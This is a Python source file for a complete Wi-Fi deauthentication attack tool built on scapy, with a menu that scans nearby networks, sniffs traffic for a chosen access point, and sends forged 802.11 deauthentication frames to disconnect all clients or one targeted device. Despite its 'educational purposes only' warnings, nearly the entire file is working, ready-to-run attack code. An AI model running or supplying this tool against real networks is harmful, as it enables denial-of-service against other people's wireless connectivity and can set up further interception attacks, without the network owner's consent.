#!/usr/bin/env python3
"""
Wi-Fi Deauther - Educational Tool
==================================
A command-line utility for educational purposes, enabling users to perform
Wi-Fi network actions such as scanning, deauthentication, and monitoring.

⚠️  WARNING: This tool is for EDUCATIONAL PURPOSES ONLY.
Use responsibly and comply with applicable laws. Unauthorized access to
computer networks is illegal in many jurisdictions.

Author: Himanshu Kumar
GitHub: https://github.com/devil136-star
LinkedIn: https://www.linkedin.com/in/himanshu-kumar-777a50292/
License: Educational Use Only
"""

import os
import sys
import time
import subprocess
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon, RadioTap, Dot11Elt
import threading
from collections import defaultdict

# Suppress scapy warnings
conf.verb = 0

class WiFiDeauther:
    def __init__(self):
        self.networks = []
        self.monitor_interface = None
        self.is_monitoring = False
        self.deauth_thread = None
        self.stop_deauth = False
        
    def check_root(self):
        """Check if running with administrator/root privileges"""
        if os.name == 'nt':  # Windows
            try:
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        else:  # Linux/Mac
            return os.geteuid() == 0
    
    def get_interfaces(self):
        """Get available network interfaces"""
        interfaces = []
        if os.name == 'nt':  # Windows
            try:
                result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                      capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Name' in line:
                        interface = line.split(':')[1].strip()
                        interfaces.append(interface)
            except:
                pass
        else:  # Linux
            interfaces = [iface for iface in get_if_list() if 'wlan' in iface or 'wifi' in iface]
        return interfaces
    
    def scan_networks(self, interface=None, duration=10):
        """Scan for available Wi-Fi networks"""
        print("\n" + "="*60)
        print("🔍 SCANNING FOR WI-FI NETWORKS...")
        print("="*60)
        print(f"Scanning for {duration} seconds...\n")
        
        self.networks = []
        networks_dict = {}
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                # Extract SSID from Dot11Elt (ID 0)
                ssid = None
                bssid = None
                channel = None
                encryption = "Open"
                
                # Get BSSID
                if pkt.haslayer(Dot11):
                    bssid = pkt[Dot11].addr2
                
                # Get signal strength
                try:
                    dbm_signal = pkt.dBm_AntSignal
                except:
                    try:
                        # Try alternative signal field
                        dbm_signal = pkt[RadioTap].dBm_AntSignal if pkt.haslayer(RadioTap) else 0
                    except:
                        dbm_signal = 0
                
                # Iterate through Dot11Elt layers to find SSID and other info
                if pkt.haslayer(Dot11Elt):
                    for elt in pkt[Dot11Elt]:
                        if elt.ID == 0:  # SSID element
                            try:
                                ssid = elt.info.decode('utf-8', errors='ignore')
                                # Handle hidden networks (empty SSID)
                                if not ssid:
                                    ssid = "<Hidden Network>"
                            except:
                                ssid = "<Unknown>"
                        elif elt.ID == 3:  # DS Parameter set (Channel)
                            try:
                                if len(elt.info) > 0:
                                    channel = ord(elt.info[0])
                            except:
                                pass
                        elif elt.ID == 48:  # RSN Information (WPA2)
                            encryption = "WPA2"
                        elif elt.ID == 221:  # Vendor Specific (WPA)
                            try:
                                if b'\x00\x50\xf2\x01\x01\x00' in bytes(elt.info):
                                    encryption = "WPA"
                            except:
                                pass
                
                # Only add network if we have a valid SSID and BSSID
                if ssid and bssid:
                    # Use BSSID as key to avoid duplicates, handle hidden networks
                    network_key = f"{bssid}"
                    if network_key not in networks_dict:
                        networks_dict[network_key] = {
                            'ssid': ssid,
                            'bssid': bssid,
                            'signal': dbm_signal,
                            'channel': channel or 'Unknown',
                            'encryption': encryption
                        }
                    else:
                        # Update signal strength if better
                        if dbm_signal > networks_dict[network_key]['signal']:
                            networks_dict[network_key]['signal'] = dbm_signal
        
        try:
            if interface:
                sniff(iface=interface, prn=packet_handler, timeout=duration)
            else:
                sniff(prn=packet_handler, timeout=duration)
        except Exception as e:
            print(f"❌ Error during scan: {e}")
            print("💡 Tip: Make sure you have the correct interface and permissions")
            return []
        
        self.networks = list(networks_dict.values())
        return self.networks
    
    def display_networks(self):
        """Display scanned networks in a formatted table"""
        if not self.networks:
            print("\n❌ No networks found. Try scanning again.")
            return
        
        print("\n" + "="*80)
        print(f"{'#':<4} {'SSID':<30} {'BSSID':<18} {'Signal':<10} {'Channel':<10} {'Encryption':<15}")
        print("="*80)
        
        for idx, network in enumerate(self.networks, 1):
            signal_str = f"{network['signal']} dBm" if network['signal'] else "N/A"
            print(f"{idx:<4} {network['ssid'][:28]:<30} {network['bssid']:<18} "
                  f"{signal_str:<10} {str(network['channel']):<10} {network['encryption']:<15}")
        
        print("="*80)
        print(f"\n✅ Found {len(self.networks)} network(s)\n")
    
    def deauthenticate(self, target_bssid, client_mac=None, interface=None, count=10):
        """
        Send deauthentication packets to disconnect a device from a network
        
        ⚠️  WARNING: This is for educational purposes only!
        """
        print("\n" + "="*60)
        print("⚠️  DEAUTHENTICATION ATTACK")
        print("="*60)
        print(f"Target BSSID: {target_bssid}")
        if client_mac:
            print(f"Target Client: {client_mac}")
        else:
            print("Target: Broadcast (all clients)")
        print(f"Packets to send: {count}")
        print("\n⚠️  This will disconnect devices from the network!")
        print("Press Ctrl+C to stop...\n")
        
        # Create deauthentication packet
        if client_mac:
            # Targeted deauth
            packet = RadioTap() / Dot11(
                type=0, subtype=12,  # Deauthentication frame
                addr1=client_mac,    # Destination (client)
                addr2=target_bssid,  # Source (AP)
                addr3=target_bssid   # BSSID
            ) / Dot11Deauth(reason=7)
        else:
            # Broadcast deauth
            packet = RadioTap() / Dot11(
                type=0, subtype=12,
                addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                addr2=target_bssid,
                addr3=target_bssid
            ) / Dot11Deauth(reason=7)
        
        try:
            sent = 0
            for i in range(count):
                if self.stop_deauth:
                    break
                sendp(packet, iface=interface, verbose=False)
                sent += 1
                if i % 5 == 0:
                    print(f"📡 Sent {sent} deauth packets...", end='\r')
                time.sleep(0.1)
            
            print(f"\n✅ Sent {sent} deauthentication packets")
            print("⚠️  Attack completed. Devices may be disconnected from the network.")
            
        except KeyboardInterrupt:
            print("\n\n⏹️  Attack stopped by user")
        except Exception as e:
            print(f"\n❌ Error: {e}")
            print("💡 Tip: Make sure you have the correct interface and permissions")
    
    def monitor_network(self, target_bssid, interface=None, duration=30):
        """Monitor network traffic for a specific BSSID"""
        print("\n" + "="*60)
        print("📊 NETWORK MONITORING")
        print("="*60)
        print(f"Monitoring BSSID: {target_bssid}")
        print(f"Duration: {duration} seconds")
        print("Press Ctrl+C to stop...\n")
        
        packet_count = defaultdict(int)
        start_time = time.time()
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11):
                if pkt.addr2 == target_bssid or pkt.addr3 == target_bssid:
                    packet_type = pkt.type
                    packet_subtype = pkt.subtype
                    packet_count[(packet_type, packet_subtype)] += 1
                    
                    # Display packet info
                    if pkt.haslayer(Dot11):
                        src = pkt.addr2
                        dst = pkt.addr3
                        print(f"📦 Type: {packet_type}, Subtype: {packet_subtype} | "
                              f"From: {src} → To: {dst}")
        
        try:
            if interface:
                sniff(iface=interface, prn=packet_handler, timeout=duration)
            else:
                sniff(prn=packet_handler, timeout=duration)
        except KeyboardInterrupt:
            print("\n\n⏹️  Monitoring stopped by user")
        except Exception as e:
            print(f"\n❌ Error: {e}")
        
        elapsed = time.time() - start_time
        print(f"\n📊 Monitoring Summary ({elapsed:.1f} seconds):")
        print("-" * 60)
        for (ptype, psubtype), count in packet_count.items():
            print(f"  Type {ptype}, Subtype {psubtype}: {count} packets")
        print("-" * 60)
    
    def show_menu(self):
        """Display main menu"""
        print("\n" + "="*60)
        print("📡 WI-FI DEAUTHER - EDUCATIONAL TOOL")
        print("="*60)
        print("1. Scan for Wi-Fi Networks")
        print("2. Display Scanned Networks")
        print("3. Deauthenticate Network (Broadcast)")
        print("4. Deauthenticate Specific Client")
        print("5. Monitor Network Traffic")
        print("6. Show Available Interfaces")
        print("7. Exit")
        print("="*60)
    
    def run(self):
        """Main execution loop"""
        # Display warning
        print("\n" + "⚠️" * 30)
        print("WARNING: This tool is for EDUCATIONAL PURPOSES ONLY!")
        print("Unauthorized access to computer networks is ILLEGAL.")
        print("Use responsibly and comply with applicable laws.")
        print("⚠️" * 30)
        
        # Check permissions
        if not self.check_root():
            print("\n⚠️  WARNING: This tool may require administrator/root privileges")
            print("Some features may not work without elevated permissions.\n")
        
        while True:
            self.show_menu()
            choice = input("\nEnter your choice (1-7): ").strip()
            
            if choice == '1':
                duration = input("Scan duration in seconds (default 10): ").strip()
                duration = int(duration) if duration.isdigit() else 10
                
                interfaces = self.get_interfaces()
                if interfaces:
                    print(f"\nAvailable interfaces: {', '.join(interfaces)}")
                    iface = input("Enter interface name (or press Enter for default): ").strip()
                    iface = iface if iface in interfaces else None
                else:
                    iface = None
                
                self.scan_networks(interface=iface, duration=duration)
                self.display_networks()
            
            elif choice == '2':
                self.display_networks()
            
            elif choice == '3':
                if not self.networks:
                    print("\n❌ No networks scanned. Please scan first (option 1).")
                    continue
                
                self.display_networks()
                try:
                    idx = int(input("\nEnter network number to deauthenticate: ")) - 1
                    if 0 <= idx < len(self.networks):
                        target = self.networks[idx]
                        count = input("Number of packets to send (default 10): ").strip()
                        count = int(count) if count.isdigit() else 10
                        
                        confirm = input(f"\n⚠️  Deauthenticate {target['ssid']}? (yes/no): ").strip().lower()
                        if confirm == 'yes':
                            interfaces = self.get_interfaces()
                            iface = None
                            if interfaces:
                                iface_input = input(f"Interface ({', '.join(interfaces)}) or Enter for default: ").strip()
                                iface = iface_input if iface_input in interfaces else None
                            
                            self.deauthenticate(target['bssid'], interface=iface, count=count)
                        else:
                            print("❌ Cancelled.")
                    else:
                        print("❌ Invalid network number.")
                except ValueError:
                    print("❌ Invalid input.")
            
            elif choice == '4':
                if not self.networks:
                    print("\n❌ No networks scanned. Please scan first (option 1).")
                    continue
                
                self.display_networks()
                try:
                    idx = int(input("\nEnter network number: ")) - 1
                    if 0 <= idx < len(self.networks):
                        target = self.networks[idx]
                        client_mac = input("Enter client MAC address (or press Enter for broadcast): ").strip()
                        count = input("Number of packets to send (default 10): ").strip()
                        count = int(count) if count.isdigit() else 10
                        
                        confirm = input(f"\n⚠️  Deauthenticate client on {target['ssid']}? (yes/no): ").strip().lower()
                        if confirm == 'yes':
                            interfaces = self.get_interfaces()
                            iface = None
                            if interfaces:
                                iface_input = input(f"Interface ({', '.join(interfaces)}) or Enter for default: ").strip()
                                iface = iface_input if iface_input in interfaces else None
                            
                            self.deauthenticate(target['bssid'], client_mac=client_mac if client_mac else None, 
                                              interface=iface, count=count)
                        else:
                            print("❌ Cancelled.")
                    else:
                        print("❌ Invalid network number.")
                except ValueError:
                    print("❌ Invalid input.")
            
            elif choice == '5':
                if not self.networks:
                    print("\n❌ No networks scanned. Please scan first (option 1).")
                    continue
                
                self.display_networks()
                try:
                    idx = int(input("\nEnter network number to monitor: ")) - 1
                    if 0 <= idx < len(self.networks):
                        target = self.networks[idx]
                        duration = input("Monitoring duration in seconds (default 30): ").strip()
                        duration = int(duration) if duration.isdigit() else 30
                        
                        interfaces = self.get_interfaces()
                        iface = None
                        if interfaces:
                            iface_input = input(f"Interface ({', '.join(interfaces)}) or Enter for default: ").strip()
                            iface = iface_input if iface_input in interfaces else None
                        
                        self.monitor_network(target['bssid'], interface=iface, duration=duration)
                    else:
                        print("❌ Invalid network number.")
                except ValueError:
                    print("❌ Invalid input.")
            
            elif choice == '6':
                interfaces = self.get_interfaces()
                if interfaces:
                    print("\n📡 Available Network Interfaces:")
                    for iface in interfaces:
                        print(f"  - {iface}")
                else:
                    print("\n❌ No wireless interfaces found.")
            
            elif choice == '7':
                print("\n👋 Exiting... Stay legal and ethical!")
                sys.exit(0)
            
            else:
                print("\n❌ Invalid choice. Please enter 1-7.")
            
            input("\nPress Enter to continue...")


if __name__ == "__main__":
    try:
        deauther = WiFiDeauther()
        deauther.run()
    except KeyboardInterrupt:
        print("\n\n👋 Exiting... Stay legal and ethical!")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        sys.exit(1)

